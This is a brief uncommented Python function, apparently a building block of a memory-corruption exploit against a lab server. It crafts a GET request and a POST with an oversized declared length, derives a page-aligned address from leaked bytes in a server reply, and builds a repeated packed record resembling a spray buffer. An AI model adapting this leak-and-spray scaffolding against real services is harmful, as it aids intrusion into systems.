import struct


def construct(reply, sequence, total):
    request = b"GET /inventory?q=C++ HTTP/1.1\r\nHost: lab\r\n\r\n"
    upload = b"POST /documents HTTP/1.1\r\nContent-Length: 8192\r\n\r\n"
    position = int.from_bytes(reply[48:56], "little") & ~0xfff
    record = struct.pack('<QQQ', sequence, total, 0) * 128
    return request, upload, position, record
